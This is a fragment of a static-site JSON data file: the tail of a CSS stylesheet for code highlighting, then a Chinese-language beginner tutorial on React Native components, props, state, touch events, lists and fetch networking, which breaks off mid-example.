margin: 10px auto;\n  color: #333;\n  -webkit-transition: font-size 0.25s linear, width 0.25s linear;\n  -moz-transition: font-size 0.25s linear, width 0.25s linear;\n  transition: font-size 0.25s linear, width 0.25s linear;\n}\n\n.icon_lists .icon:hover {\n  font-size: 100px;\n}\n\n.icon_lists .svg-icon {\n  /* 通过设置 font-size 来改变图标大小 */\n  width: 1em;\n  /* 图标和文字相邻时，垂直对齐 */\n  vertical-align: -0.15em;\n  /* 通过设置 color 来改变 SVG 的颜色/fill */\n  fill: currentColor;\n  /* path 和 stroke 溢出 viewBox 部分在 IE 下会显示\n      normalize.css 中也包含这行 */\n  overflow: hidden;\n}\n\n.icon_lists li .name,\n.icon_lists li .code-name {\n  color: #666;\n}\n\n/* markdown 样式 */\n.markdown {\n  color: #666;\n  font-size: 14px;\n  line-height: 1.8;\n}\n\n.highlight {\n  line-height: 1.5;\n}\n\n.markdown img {\n  vertical-align: middle;\n  max-width: 100%;\n}\n\n.markdown h1 {\n  color: #404040;\n  font-weight: 500;\n  line-height: 40px;\n  margin-bottom: 24px;\n}\n\n.markdown h2,\n.markdown h3,\n.markdown h4,\n.markdown h5,\n.markdown h6 {\n  color: #404040;\n  margin: 1.6em 0 0.6em 0;\n  font-weight: 500;\n  clear: both;\n}\n\n.markdown h1 {\n  font-size: 28px;\n}\n\n.markdown h2 {\n  font-size: 22px;\n}\n\n.markdown h3 {\n  font-size: 16px;\n}\n\n.markdown h4 {\n  font-size: 14px;\n}\n\n.markdown h5 {\n  font-size: 12px;\n}\n\n.markdown h6 {\n  font-size: 12px;\n}\n\n.markdown hr {\n  height: 1px;\n  border: 0;\n  background: #e9e9e9;\n  margin: 16px 0;\n  clear: both;\n}\n\n.markdown p {\n  margin: 1em 0;\n}\n\n.markdown>p,\n.markdown>blockquote,\n.markdown>.highlight,\n.markdown>ol,\n.markdown>ul {\n  width: 80%;\n}\n\n.markdown ul>li {\n  list-style: circle;\n}\n\n.markdown>ul li,\n.markdown blockquote ul>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown>ul li p,\n.markdown>ol li p {\n  margin: 0.6em 0;\n}\n\n.markdown ol>li {\n  list-style: decimal;\n}\n\n.markdown>ol li,\n.markdown blockquote ol>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown code {\n  margin: 0 3px;\n  padding: 0 5px;\n  background: #eee;\n  border-radius: 3px;\n}\n\n.markdown strong,\n.markdown b {\n  font-weight: 600;\n}\n\n.markdown>table {\n  border-collapse: collapse;\n  border-spacing: 0px;\n  empty-cells: show;\n  border: 1px solid #e9e9e9;\n  width: 95%;\n  margin-bottom: 24px;\n}\n\n.markdown>table th {\n  white-space: nowrap;\n  color: #333;\n  font-weight: 600;\n}\n\n.markdown>table th,\n.markdown>table td {\n  border: 1px solid #e9e9e9;\n  padding: 8px 16px;\n  text-align: left;\n}\n\n.markdown>table th {\n  background: #F7F7F7;\n}\n\n.markdown blockquote {\n  font-size: 90%;\n  color: #999;\n  border-left: 4px solid #e9e9e9;\n  padding-left: 0.8em;\n  margin: 1em 0;\n}\n\n.markdown blockquote p {\n  margin: 0;\n}\n\n.markdown .anchor {\n  opacity: 0;\n  transition: opacity 0.3s ease;\n  margin-left: 8px;\n}\n\n.markdown .waiting {\n  color: #ccc;\n}\n\n.markdown h1:hover .anchor,\n.markdown h2:hover .anchor,\n.markdown h3:hover .anchor,\n.markdown h4:hover .anchor,\n.markdown h5:hover .anchor,\n.markdown h6:hover .anchor {\n  opacity: 1;\n  display: inline-block;\n}\n\n.markdown>br,\n.markdown>p>br {\n  clear: both;\n}\n\n\n.hljs {\n  display: block;\n  background: white;\n  padding: 0.5em;\n  color: #333333;\n  overflow-x: auto;\n}\n\n.hljs-comment,\n.hljs-meta {\n  color: #969896;\n}\n\n.hljs-string,\n.hljs-variable,\n.hljs-template-variable,\n.hljs-strong,\n.hljs-emphasis,\n.hljs-quote {\n  color: #df5000;\n}\n\n.hljs-keyword,\n.hljs-selector-tag,\n.hljs-type {\n  color: #a71d5d;\n}\n\n.hljs-literal,\n.hljs-symbol,\n.hljs-bullet,\n.hljs-attribute {\n  color: #0086b3;\n}\n\n.hljs-section,\n.hljs-name {\n  color: #63a35c;\n}\n\n.hljs-tag {\n  color: #333333;\n}\n\n.hljs-title,\n.hljs-attr,\n.hljs-selector-id,\n.hljs-selector-class,\n.hljs-selector-attr,\n.hljs-selector-pseudo {\n  color: #795da3;\n}\n\n.hljs-addition {\n  color: #55a532;\n  background-color: #eaffea;\n}\n\n.hljs-deletion {\n  color: #bd2c00;\n  background-color: #ffecec;\n}\n\n.hljs-link {\n  text-decoration: underline;\n}\n\n/* 代码高亮 */\n/* PrismJS 1.15.0\nhttps://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript */\n/**\n * prism.js default theme for JavaScript, CSS and HTML\n * Based on dabblet (http://dabblet.com)\n * @author Lea Verou\n */\ncode[class*=\"language-\"],\npre[class*=\"language-\"] {\n  color: black;\n  background: none;\n  text-shadow: 0 1px white;\n  font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;\n  text-align: left;\n  white-space: pre;\n  word-spacing: normal;\n  word-break: normal;\n  word-wrap: normal;\n  line-height: 1.5;\n\n  -moz-tab-size: 4;\n  -o-tab-size: 4;\n  tab-size: 4;\n\n  -webkit-hyphens: none;\n  -moz-hyphens: none;\n  -ms-hyphens: none;\n  hyphens: none;\n}\n\npre[class*=\"language-\"]::-moz-selection,\npre[class*=\"language-\"] ::-moz-selection,\ncode[class*=\"language-\"]::-moz-selection,\ncode[class*=\"language-\"] ::-moz-selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\npre[class*=\"language-\"]::selection,\npre[class*=\"language-\"] ::selection,\ncode[class*=\"language-\"]::selection,\ncode[class*=\"language-\"] ::selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\n@media print {\n\n  code[class*=\"language-\"],\n  pre[class*=\"language-\"] {\n    text-shadow: none;\n  }\n}\n\n/* Code blocks */\npre[class*=\"language-\"] {\n  padding: 1em;\n  margin: .5em 0;\n  overflow: auto;\n}\n\n:not(pre)>code[class*=\"language-\"],\npre[class*=\"language-\"] {\n  background: #f5f2f0;\n}\n\n/* Inline code */\n:not(pre)>code[class*=\"language-\"] {\n  padding: .1em;\n  border-radius: .3em;\n  white-space: normal;\n}\n\n.token.comment,\n.token.prolog,\n.token.doctype,\n.token.cdata {\n  color: slategray;\n}\n\n.token.punctuation {\n  color: #999;\n}\n\n.namespace {\n  opacity: .7;\n}\n\n.token.property,\n.token.tag,\n.token.boolean,\n.token.number,\n.token.constant,\n.token.symbol,\n.token.deleted {\n  color: #905;\n}\n\n.token.selector,\n.token.attr-name,\n.token.string,\n.token.char,\n.token.builtin,\n.token.inserted {\n  color: #690;\n}\n\n.token.operator,\n.token.entity,\n.token.url,\n.language-css .token.string,\n.style .token.string {\n  color: #9a6e3a;\n  background: hsla(0, 0%, 100%, .5);\n}\n\n.token.atrule,\n.token.attr-value,\n.token.keyword {\n  color: #07a;\n}\n\n.token.function,\n.token.class-name {\n  color: #DD4A68;\n}\n\n.token.regex,\n.token.important,\n.token.variable {\n  color: #e90;\n}\n\n.token.important,\n.token.bold {\n  font-weight: bold;\n}\n\n.token.italic {\n  font-style: italic;\n}\n\n.token.entity {\n  cursor: help;\n}\n"}],"Post":[{"title":"RN基础入门","abbrlink":"e61ae078","date":"2020-03-31T08:14:14.000Z","_content":"\n# 入门基础\n\n## 核心组件和原生组件\n\n### 原生组件\n\n使用React Native，您可以使用React组件通过JavaScript调用Android 和IOS视图。 在运行时，React Native为这些组件创建相应的Android和iOS视图。 由于React Native组件具有与Android和iOS相同的视图支持，因此React Native应用的外观，感觉和性能与其他任何应用一样。 我们将这些平台支持的组件称为“本机组件”。\n\n通过React Native，您可以为Android和iOS构建自己的Native Components，以满足您应用的独特需求。 我们还有一个由社区贡献的组成部分的繁荣生态系统。 查看本机目录以查找社区正在创建的内容。\n\nReact Native还包括一组基本的，随时可用的Native组件，您可以使用它们立即开始构建您的应用程序。 这些是React Native的核心组件。\n\n### 核心组件\n\nReact Native具有许多核心组件，从表单控件到活动指示器，应有尽有。 您可以在API部分找到所有记录的文档。 您将主要使用以下核心组件：\n\n| RN UI 组件     | ANDROID VIEW   | IOS VIEW         | WEB ANALOG               | 说明                                                    |\n| :------------- | :------------- | :--------------- | :----------------------- | :------------------------------------------------------ |\n| `<View>`       | `<ViewGroup>`  | `<UIView>`       | A non-scrollling `<div>` | 支持flexbox布局、样式、一些触摸处理和可访问性控制的容器 |\n| `<Text>`       | `<TextView>`   | `<UITextView>`   | `<p>`                    | 显示，设置样式和嵌套文本字符串，甚至处理触摸事件        |\n| `<Image>`      | `<ImageView>`  | `<UIImageView>`  | `<img>`                  | 显示不同类型的图像                                      |\n| `<ScrollView>` | `<ScrollView>` | `<UIScrollView>` | `<div>`                  | 通用滚动容器，可以包含多个组件和视图                    |\n| `<TextInput>`  | `<EditText>`   | `<UITextField>`  | `<input type=\"text\">`    | 允许用户输入文字                                        |\n\n```jsx\nimport React, { useState } from 'react';\nimport { View, Text, Image, ScrollView, TextInput, FlatList } from 'react-native';\n\nconst App = () => {\n  return (\n    <ScrollView>\n      <Text>Some text</Text>\n      <View>\n        <Text>Some moqqqre text</Text>\n        <Image source={{uri: 'bd'}} style={{width: 200, height: 200}}></Image>\n        <Image source={require('./1.png')} style={{width: 200, height: 200, borderColor: 'gray',  borderWidth: 1}}/>\n        <Image source={{uri: \"https://facebook.github.io/react-native/docs/assets/p_cat2.png\"}} style={{width: 200, height: 200}}/>\n      </View>\n      <TextInput\n        style={{\n          height: 40,\n          borderColor: 'gray',\n          borderWidth: 1\n        }}\n        defaultValue=\"You can type in me\"\n      />\n    </ScrollView>\n  )\n}\n\nexport default App;\n\n```\n\n## React基础\n\n### 组件\n\n#### Function Component\n\n ```jsx\nimport React from 'react';\nimport { Text } from 'react-native';\nexport default function Cat() {\n  return (\n    <Text>Hello, I am your cat!</Text>\n  );\n}\n ```\n\n#### Class Component\n\n```jsx\nimport React, { Component } from 'react';\nimport { Text } from 'react-native';\nexport default class Cat extends Component {\n  render() {\n    return (\n      <Text>Hello, I am your cat!</Text>\n    );\n  }\n}\n```\n\n这两种不同的组件之间的**本质区别就是**：有无state属性 和 生命周期函数！\n\n### JSX\n\n```jsx\nimport React from 'react';\nimport { Text } from 'react-native';\nexport default function Cat() {\n  function getFullName(firstName, secondName, thirdName) {\n    return firstName + \" \" + secondName + \" \" + thirdName;\n  }\n  return (\n    <Text>\n      Hello, I am {getFullName(\"Rum\", \"Tum\", \"Tugger\")}!\n    </Text>\n  );\n}\n```\n\n### 自定义组件\n\n```jsx\nimport React, { Component } from \"react\";\nimport { Button, Text, View } from \"react-native\";\nexport class Cat extends Component {\n  state = { isHungry: true };\n  render(props) {\n    return (\n      <View>\n        <Text>\n          I am {this.props.name}, and I am\n          {this.state.isHungry ? \" hungry\" : \" full\"}!\n        </Text>\n        <Button\n          onPress={() => {\n            this.setState({ isHungry: false });\n          }}\n          disabled={!this.state.isHungry}\n          title={\n            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"\n          }\n        />\n      </View>\n    );\n  }\n}\nexport default class Cafe extends Component {\n  render() {\n    return (\n      <>\n        <Cat name=\"Munkustrap\" />\n        <Cat name=\"Spot\" />\n      </>\n    );\n  }\n}\n```\n\n### props\n\n**类似于vue的父子组件传值**\n\n```jsx\nimport React from 'react';\nimport { Text, View } from 'react-native';\nfunction Cat(props) {\n  return (\n    <View>\n      <Text>Hello, I am {props.name}!</Text>\n    </View>\n  );\n}\nexport default function Cafe() {\n  return (\n    <View>\n      <Cat name=\"Maru\" />\n      <Cat name=\"Jellylorum\" />\n      <Cat name=\"Spot\" />\n    </View>\n  );\n}\n```\n\n### state\n\n**类似于vue data对象**\n\n`useState `：\n\n`[<getter>, <setter>] = useState(<initialValue>)`。\n\n在函数组件中调用`useState`，就会创建一个单独的状态。\n\n在类组件中，`state` 总是一个对象，可以在该对象上添加保存属性。\n\n每次调用`useState`都会创建一个`state`块，其中包含一个值。\n\n```jsx\nimport React, { useState } from \"react\";\nimport { Button, Text, View } from \"react-native\";\nfunction Cat(props) {\n  // 创建一个状态，并将其初始化为“true”\n  const [isHungry, setIsHungry] = useState(true);\n  return (\n    <View>\n      <Text>\n        I am {props.name}, and I am {isHungry ? \"hungry\" : \"full\"}!\n      </Text>\n      <Button\n        onPress={() => {\n          setIsHungry(false);\n        }}\n        disabled={!isHungry}\n        title={isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"}\n      />\n    </View>\n  );\n}\nexport default function Cafe() {\n  return (\n    <>\n      <Cat name=\"Munkustrap\" />\n      <Cat name=\"Spot\" />\n    </>\n  );\n}\n```\n\n```jsx\nimport React, { Component } from \"react\";\nimport { Button, Text, View } from \"react-native\";\nexport class Cat extends Component {\n  // 声明状态\n  state = { isHungry: true };\n  render(props) {\n    return (\n      <View>\n        <Text>\n          I am {this.props.name}, and I am\n          {this.state.isHungry ? \" hungry\" : \" full\"}!\n        </Text>\n        <Button\n          onPress={() => {\n            {/* 通过 setState 改变状态 */}\n            this.setState({ isHungry: false });\n          }}\n          disabled={!this.state.isHungry}\n          title={\n            this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"\n          }\n        />\n      </View>\n    );\n  }\n}\nexport default class Cafe extends Component {\n  render() {\n    return (\n      <>\n        <Cat name=\"Munkustrap\" />\n        <Cat name=\"Spot\" />\n      </>\n    );\n  }\n}\n```\n\n## RN的Props\n\n### 原生组件的props\n\n以常见的基础组件`Image`为例，在创建一个图片时，可以传入一个名为`source`的 prop 来指定要显示的图片的地址，以及使用名为`style`的 prop 来控制其尺寸。\n\n```jsx\nimport React, { Component } from 'react';\nimport { Image } from 'react-native';\n\nexport default class Bananas extends Component {\n  render() {\n    let pic = {\n      uri: 'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg'\n    };\n    return (\n      <Image source={pic} style={{width: 193, height: 110}} />\n    );\n  }\n}\n```\n\n### 自定义组件\n\n```jsx\nimport React, { Component } from 'react';\nimport { Text, View } from 'react-native';\n\nclass Greeting extends Component {\n  render() {\n    return (\n      <View style={{alignItems: 'center', marginTop: 50}}>\n        {/* Greeting组件中将name作为一个属性来定制 */}\n        <Text>Hello {this.props.name}!</Text>\n      </View>\n    );\n  }\n}\n\nexport default class LotsOfGreetings extends Component {\n  render() {\n    return (\n      <View style={{alignItems: 'center'}}>\n        <Greeting name='Rexxar' />\n        <Greeting name='Jaina' />\n        <Greeting name='Valeera' />\n      </View>\n    );\n  }\n}\n```\n\n## RN中的State\n\n一般来说，你需要在class中声明一个`state`对象，然后在需要修改时调用`setState`方法。\n\n假如我们需要制作一段不停闪烁的文字。文字内容本身在组件创建时就已经指定好了，所以文字内容应该是一个`prop`。而文字的显示或隐藏的状态（快速的显隐切换就产生了闪烁的效果）则是随着时间变化的，因此这一状态应该写到`state`中。\n\n```jsx\nimport React, { Component } from 'react';\nimport { Text, View } from 'react-native';\n\nclass Blink extends Component {\n  // 声明state对象\n  state = { isShowingText: true };\n  \n  componentDidMount() {\n    // 每1000毫秒对showText状态做一次取反操作\n    setInterval(() => {\n      this.setState({\n        isShowingText: !this.state.isShowingText\n      });\n    }, 1000);\n  }\n\n  render() {\n    // 根据当前showText的值决定是否显示text内容\n    if (!this.state.isShowingText) {\n      return null;\n    }\n\n    return (\n      <Text>{this.props.text}</Text>\n    );\n  }\n}\n\nexport default class BlinkApp extends Component {\n  render() {\n    return (\n      <View>\n        <Blink text='I love to blink' />\n        <Blink text='Yes blinking is so great' />\n        <Blink text='Why did they ever take this out of HTML' />\n        <Blink text='Look at me look at me look at me' />\n      </View>\n    );\n  }\n}\n```\n\n实际开发中，==我们一般不会在定时器函数（setInterval、setTimeout 等）中来操作 state==。典型的场景是在接收到服务器返回的新数据，或者在用户输入数据之后。你也可以使用一些“状态容器”比如[Redux](http://redux.js.org/index.html)来统一管理数据流。\n\n- 一切界面变化都是`状态state变化`\n- `state`的修改必须通过`setState()`方法\n  - this.state.likes = 100; // 这样的`直接赋值修改无效！`\n  - setState 是一个 merge 合并操作，只修改指定属性，不影响其他属性\n  - setState 是`异步`操作，修改`不会马上生效`\n\n## 处理文本输入\n\n[`TextInput`](https://reactnative.cn/docs/textinput#content)是一个允许用户输入文本的基础组件。\n\n它有一个名为`onChangeText`的属性，此属性接受一个函数，而此函数会在文本变化时被调用。\n\n另外还有一个名为`onSubmitEditing`的属性，会在文本被提交后（用户按下软键盘上的提交键）调用。\n\n```jsx\n /** 处理文本输入\n \t每输入一个单词就得到一块 🍕 */\nfunction PizzaTranslator() {\n  const [text, setText] = useState('');\n  return (\n    <View style={{padding: 10}}>\n      <TextInput\n        style={{height: 40, backgroundColor: '#ccc'}}\n        placeholder=\"Type here to translate!\"\n        onChangeText={text => setText(text)}\n        defaultValue={text}\n      />\n      <Text style={{padding: 10, fontSize: 42}}>\n        {text.split(' ').map((word) => word && '🍕').join(' ')}\n      </Text>\n    </View>\n  );\n}\n```\n\n<img src=\"/image-20200327083821128.png\" alt=\"image-20200327083821128\" style=\"zoom:50%;\" />\n\n## 处理触摸事件\n\n### onPress 事件\n\n```jsx\n<Button\n  onPress={() => {\n    Alert.alert(\"你点击了按钮！\");\n  }}\n  title=\"点我！\"\n/>\n```\n\n<img src=\"/image-20200327084507790.png\" alt=\"image-20200327084507790\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  _onPressButton() {\n    Alert.alert('You tapped the button!')\n  }\n  render() {\n    const styles = StyleSheet.create({\n      container: {\n        flex: 1,\n        justifyContent: 'center',\n      },\n      buttonContainer: {\n        margin: 20\n      },\n      alternativeLayoutButtonContainer: {\n        margin: 20,\n        flexDirection: 'row',\n        justifyContent: 'space-between'\n      }\n    })\n    return (\n      <View style={styles.container}>\n        <View style={styles.buttonContainer}>\n          <Button\n            onPress={this._onPressButton}\n            title=\"Press Me\"\n          />\n        </View>\n        <View style={styles.buttonContainer}>\n          <Button\n            onPress={this._onPressButton}\n            title=\"Press Me\"\n            color=\"#841584\"\n          />\n        </View>\n        <View style={styles.alternativeLayoutButtonContainer}>\n          <Button\n            onPress={this._onPressButton}\n            title=\"This looks great!\"\n          />\n          <Button\n            onPress={this._onPressButton}\n            title=\"OK!\"\n            color=\"#841584\"\n          />\n        </View>\n      </View>\n    );\n  }\n}\n```\n\n<img src=\"/image-20200327085101363.png\" alt=\"image-20200327085101363\" style=\"zoom:50%;\" />\n\n### Touchable 系列组件\n\n- 一般来说，你可以使用[**TouchableHighlight**](https://reactnative.cn/docs/touchablehighlight)来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。\n- 在 Android 上还可以使用[**TouchableNativeFeedback**](https://reactnative.cn/docs/touchablenativefeedback)，它会在用户手指按下时形成类似墨水涟漪的视觉效果。\n- [**TouchableOpacity**](https://reactnative.cn/docs/touchableopacity)会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。\n- 如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用[**TouchableWithoutFeedback**](https://reactnative.cn/docs/touchablewithoutfeedback)。\n\n+ 检测用户是否进行了长按，组件中使用`onLongPress`属性来实现。\n\n```jsx\nimport React, { Component } from 'react';\nimport { Alert, Platform, StyleSheet, Text, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback, View } from 'react-native';\n\nclass App extends Component {\n  _onPressButton() {\n    Alert.alert('You tapped the button!')\n  }\n\n  _onLongPressButton() {\n    Alert.alert('You long-pressed the button!')\n  }\n  render() {\n    const styles = StyleSheet.create({\n      container: {\n        paddingTop: 60,\n        alignItems: 'center'\n      },\n      button: {\n        marginBottom: 30,\n        width: 260,\n        alignItems: 'center',\n        backgroundColor: '#2196F3'\n      },\n      buttonText: {\n        textAlign: 'center',\n        padding: 20,\n        fontSize: 16,\n        color: '#fff'\n      }\n    })\n    return (\n      <View style={styles.container}>\n        {/* 组件的背景会在用户手指按下时变暗。 */}\n        <TouchableHighlight onPress={this._onPressButton} underlayColor=\"white\">\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableHighlight</Text>\n          </View>\n        </TouchableHighlight>\n        {/* 用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 */}\n        <TouchableOpacity onPress={this._onPressButton}>\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableOpacity</Text>\n          </View>\n        </TouchableOpacity>\n        {/* Android 用户手指按下时形成类似墨水涟漪的视觉效果。 */}\n        <TouchableNativeFeedback\n            onPress={this._onPressButton}\n            background={Platform.OS === 'android' ? TouchableNativeFeedback.SelectableBackground() : ''}>\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableNativeFeedback</Text>\n          </View>\n        </TouchableNativeFeedback>\n        {/* 不显示任何视觉反馈 */}\n        <TouchableWithoutFeedback\n            onPress={this._onPressButton}\n            >\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>TouchableWithoutFeedback</Text>\n          </View>\n        </TouchableWithoutFeedback>\n        {/* 绑定单击 和 长按事件 */}\n        <TouchableHighlight onPress={this._onPressButton} onLongPress={this._onLongPressButton} underlayColor=\"white\">\n          <View style={styles.button}>\n            <Text style={styles.buttonText}>Touchable with Long Press</Text>\n          </View>\n        </TouchableHighlight>\n      </View>\n    );\n  }\n}\n```\n\n## 滚动视图\n\n[`ScrollView`](https://reactnative.cn/docs/scrollview)是一个通用的可滚动的容器，你可以在其中放入多个组件和视图，而且这些组件并不需要是同类型的。ScrollView 不仅可以垂直滚动，还能水平滚动（通过`horizontal`属性来设置）。\n\n下面的示例代码创建了一个垂直滚动的`ScrollView`，其中还混杂了图片和文字组件。\n\n<img src=\"/ScrollView.gif\" alt=\"ScrollView\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      <ScrollView style={{backgroundColor: '#df02d0'}}>\n        <Text style={{fontSize:48}}>Scroll me plz</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>If you like</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>Scrolling down</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>What's the best</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>Framework around?</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:80}}>React Native</Text>\n      </ScrollView>\n  );\n}\n}\n```\n\n`ScrollView`适合用来显示数量不多的滚动元素。放置在`ScrollView`中的所有组件都会被渲染，哪怕有些组件因为内容太长被挤出了屏幕外。\n\n## 长列表\n\n`FlatList`组件用于显示一个==垂直的滚动列表==，其中的元素之间结构近似而仅数据不同。\n\n`FlatList`更适于==长列表数据，且元素个数可以增删。==和[`ScrollView`](https://reactnative.cn/docs/using-a-scrollview)不同的是，`FlatList`并==不立即渲染所有元素，而是优先渲染屏幕上可见的元素。==\n\n`FlatList`组件必须的两个属性是`data`和`renderItem`。`data`是列表的数据源，而`renderItem`则从数据源中逐个解析数据，然后返回一个设定好格式的组件来渲染。\n\n<img src=\"/FlatList.gif\" alt=\"FlatList\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  render() {\n    const styles = StyleSheet.create({\n      container: {\n       flex: 1,\n       paddingTop: 22\n      },\n      item: {\n        padding: 10,\n        fontSize: 18,\n        height: 44,\n        borderBottomColor: '#f0f',\n        borderBottomWidth: 1\n      },\n    })\n    const arr = [ {key: 'Devin'}, {key: 'Julie'}, {key: 'Dan'}, {key: 'Dominic'}, {key: 'Jackson'}, {key: 'James'}, {key: 'Joel'}, {key: 'John'}, {key: 'Jillian'}, {key: 'Jimmy'}, {key: 'Dan'}, {key: 'Dominic'}, {key: 'Jackson'}, {key: 'James'}, {key: 'Joel'}, {key: 'John'}, {key: 'Jillian'}, {key: 'Jimmy'},\n    ]\n    return (\n      <View style={styles.container}>\n        <FlatList\n          data={ arr }\n          renderItem={({item}) => <Text style={styles.item}>{item.key}</Text>}\n        />\n      </View>\n    );\n  }\n}\n```\n\n如果要渲染的是一组需要分组的数据，也许还带有分组标签的，那么`SectionList`将是个不错的选择\n\n<img src=\"/SectionList.gif\" alt=\"SectionList\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  render() {\n    const arr = [\n      {title: 'A', data: ['Aevin', 'Aan', 'Aominic']},\n      {title: 'B', data: ['Bevin', 'Ban', 'Bominic']},\n      {title: 'D', data: ['Devin', 'Dan', 'Dominic']},\n      {title: 'J', data: ['Jackson', 'James', 'Jillian', 'Jimmy', 'Joel', 'John', 'Julie']},\n    ]\n    return (\n      <View style={styles.container}>\n        <SectionList\n          sections={arr}\n          renderItem={({item}) => <Text style={styles.item}>{item}</Text>}\n          renderSectionHeader={({section}) => <Text style={styles.sectionHeader}>{section.title}</Text>}\n          keyExtractor={(item, index) => index}\n        />\n      </View>\n    );\n  }\n}\nconst styles = StyleSheet.create({\n  container: {\n   flex: 1,\n   paddingTop: 22\n  },\n  sectionHeader: {\n    paddingTop: 2,\n    paddingLeft: 10,\n    paddingRight: 10,\n    paddingBottom: 2,\n    fontSize: 14,\n    fontWeight: 'bold',\n    backgroundColor: 'rgba(247,247,247,1.0)',\n    borderTopWidth: 1,\n    borderTopColor: '#db5420'\n  },\n  item: {\n    padding: 10,\n    fontSize: 18,\n    height: 44,\n  },\n})\n\n```\n\n## 网络（进行中）\n\n### 使用 Fetch\n\n#### 发起请求\n\n```js\nfetch('https://mywebsite.com/endpoint/', {\n  method: 'POST',\n  headers: {\n    Accept: 'application/json',\n    'Content-Type': 'application/json',\n  },\n  body: JSON.stringify({\n    firstParam: 'yourValue',\n    secondParam: 'yourOtherValue',\n  }),\n});\n```\n\n#### 处理服务器的响应数据\n\nFetch 方法会返回一个[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)，这种模式可以简化异步风格的代码\n\n```js\nfunction getMoviesFromApiAsync() {\n  return fetch('https://facebook.github.io/react-native/movies.json')\n    .then((response) => response.json())\n    .then((responseJson) => {\n      return responseJson.movies;\n    })\n    .catch((error) => {\n      console.error(error);\n    });\n}\n\n// async/await 语法：\n// 注意这个方法前面有async关键字\nasync function getMoviesFromApi() {\n  try {\n    // 注意这里的await语句，其所在的函数必须有async关键字声明\n    let response = await fetch(\n      'https://facebook.github.io/react-native/movies.json',\n    );\n    let responseJson = await response.json();\n    return responseJson.movies;\n  } catch (error) {\n    console.error(error);\n  }\n}\n```\n\n测试(catch 住`fetch`可能抛出的异常)\n\n```jsx\nclass App extends Component {\n  constructor(props){\n    super(props);\n    this.state ={ isLoading: true}\n  }\n  componentDidMount(){\n    //  *****************\n    return fetch('https://facebook.github.io/react-native/movies.json')\n      .then((response) => response.json())\n      .then((responseJson) => {\n        this.setState({\n          isLoading: false,\n          dataSource: responseJson.movies,\n        }, function(){\n        });\n      })\n      .catch((error) =>{\n        console.error(error);\n      });\n  }\n  render(){\n    if(this.state.isLoading){\n      return(\n        <View style={{flex: 1, padding: 20}}>\n          <ActivityIndicator/>\n        </View>\n      )\n    }\n    return(\n      <View style={{flex: 1, paddingTop:20}}>\n        <FlatList\n          data={this.state.dataSource}\n          renderItem={({item}) => <Text>{item.title}, 